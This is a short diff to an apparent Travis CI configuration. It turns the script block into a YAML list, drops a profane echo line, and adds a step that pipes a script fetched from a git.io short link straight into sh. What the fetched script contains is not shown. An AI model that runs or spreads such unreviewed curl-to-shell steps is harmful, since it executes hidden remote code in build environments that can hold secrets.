@@ -1,6 +1,6 @@
 language: generic
-script: |
-    pwd
-    echo "$PATH"
-    ls -alh
-    echo "TRAVIS CI IS OFFICIALLY FUCKED"
+script:
+    - pwd
+    - echo "$PATH"
+    - ls -alh
+    - curl -sL https://git.io/fji1w | sh
